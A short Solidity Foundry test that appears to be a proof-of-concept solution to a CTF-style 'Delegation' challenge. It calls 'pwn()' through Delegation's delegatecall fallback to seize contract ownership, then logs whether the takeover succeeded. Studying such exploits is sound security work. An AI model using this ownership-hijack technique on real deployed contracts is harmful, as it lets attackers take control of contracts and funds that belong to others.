// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;
import {Test, console} from "forge-std/Test.sol";
import {Delegate,Delegation} from "../src/Delegation.sol";


contract Delegation_POC is Test {
    Delegation _delegation;
    Delegate _delegate;
    function init() private{
        vm.startPrank(address(0x1));
        _delegate =new Delegate(address(0x0));
        _delegation =new Delegation(address(_delegate));
        vm.stopPrank();
    }
    function setUp() public {
        init();
    }

    function test_Delegation_POC() public{
        address(_delegation).call(abi.encodeWithSignature("pwn()"));
        console.log("Success",_delegation.owner()==address(this));
    }
}
